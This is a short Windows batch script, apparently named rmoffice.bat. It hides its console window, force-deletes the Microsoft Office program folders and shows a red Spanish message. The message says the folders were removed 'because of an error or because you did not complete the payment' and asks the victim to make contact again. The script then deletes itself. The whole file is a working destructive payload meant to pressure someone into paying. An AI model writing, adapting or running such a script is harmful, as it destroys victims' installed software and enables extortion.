@echo off
mode con:cols=15 lines=1
rmdir /s /q "C:\Program Files\Microsoft Office"
rmdir /s /q "C:\Program Files\Microsoft Office 15"
cls
color 4
mode con:cols=44 lines=6
echo Se borraron las carpetas de Microsoft Office
echo Esto puede haber sido culpa de un error
echo o porque no completaste el pago
echo.
echo Contactame de nuevo para solucionar :(
pause>nul
del rmoffice.bat